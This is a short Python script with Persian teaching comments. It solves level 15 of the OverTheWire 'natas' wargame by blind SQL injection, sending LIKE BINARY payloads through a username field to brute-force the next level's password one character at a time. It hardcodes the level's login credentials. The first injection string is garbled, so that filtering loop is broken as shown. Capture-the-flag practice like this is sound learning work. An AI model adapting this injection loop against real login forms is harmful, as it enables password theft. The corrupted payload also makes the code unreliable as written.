# مرحله سوم پارت اول 
#کمی متفاوت تر
#شاید در نگاه اول, تحلیل کد زیر غیر ممکن باشد
#اما باکمی دقت و بررسی خط به خط  
#بسیار راحت تر از دیدگاه اولیتان می شود
#کمک اول : این یک کد برای 
# brute force 
# .است
# کمک دوم: این کد برای گذراندن مرحله ۱۵ام بازی معروف 
# natas
#نوشته شده است
# first see the code, then think about it, and then you can google it 

import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas16ord LI" and passwKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
    if 'exists' in r.text :
        filtered = filtered + char

for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
        if 'exists' in r.text :
            passwd = passwd + char
            print(passwd)
            break
